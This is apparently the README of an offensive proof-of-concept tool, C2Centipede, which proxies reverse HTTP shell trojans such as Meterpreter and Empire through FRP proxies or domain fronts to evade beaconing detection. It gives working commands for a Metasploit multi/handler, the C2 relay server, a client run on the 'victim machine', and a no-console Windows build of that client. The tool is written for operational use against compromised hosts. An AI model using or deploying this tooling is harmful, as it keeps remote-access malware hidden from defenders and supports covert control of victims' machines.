# C2Centipede (alpha)

## What is C2Centipede?
C2Centipede is a Proof of Concept proxy for reverse HTTP shell tools (like metasploit or empire) to evade beaconing detection by 1)reducing the beaconing 2)route the C2 communications from the trojan through different servers, currently using FRP reverse proxies or multiple Domain Fronts.

## How does it work?
There are two basic components of C2Centipede, client and server. The client is executed in the victim machine along the trojan (e.g. reverse http meterpreter) and receives the trojan's requests. The client will be in charge of faking answers to the trojan to keep it alive and choosing the route the trojan beacon should follow. The original HTTP request from the trojan is wrapped and encrypted using a Fernet symmetric key.

The server component receives the requests from the c2centipede client, decrypts them and sends them to the handler (Metasploit http handler, empire, etc), sending the answer back to the c2centipede client, along with it's own commands that affect the behaviour of the client. The operator can modify the behaviour of the client on the fly, for example by decreasing or increasing the number of fake answers to the trojan, or adding new routes the client can use to communicate with the server. The control data for C2Centipede is piggybacked on the trojans requests, so there is no additional "noise" in the network.

Additionally there is a GUI for the operator.


## Sample commands

### On the server
The server uses python3

1) Run your handler /msfconsole -x "use exploit/multi/handler;set payload python/meterpreter_reverse_http;set exitonsession false; set lport 8888; set lhost 0.0.0.0; run -j
You can use any reverse HTTP payload, not just python.


2) python3 c2c_server.py -p 9093 -d 127.0.0.1:8888 -a lalala:lelele -b -f xkJSFO2DKQyYxj9F6Q4XCXIviiFuxNzZjsEfNc9NgoM=

-p port to listen to
-d destination of the packages (This would be your MSF or Empire handler address)
-a authentication for the c2centipede server, the operator needs to know these to send commands to the c2centipede server.
-b beep (for debugging, you can listen to the beacons of your trojan)
-f Fernet key, symmetric shared with the client. (if not specified it will generate a new one)


3)Set your RFP proxies and/or CDNs.


### On the victim machine
The client uses python2 because _reasons_

1) python2 c2c_client.py -p 2233 -b 127.0.0.1 -s 127.0.0.1:9093 -f xkJSFO2DKQyYxj9F6Q4XCXIviiFuxNzZjsEfNc9NgoM=
-p port where the client listens to
-b bind to this interface
-s server addresses (direct connection, frp proxy or domain fronted host), you can add as many as you wish (or use -t to use a textfile with newline separated server addresses)
-f fernet symmetric key as specified on the server component.

Optionally, you can compile the client for windows using pyinstaller
wine pyinstaller.exe --onefile --noconsole c2c_client.py

2)Generate your meterpreter, empire or other trojan pointing to localhost and the port specified on the -p argument (in this case 2233)

3)Run the trojan
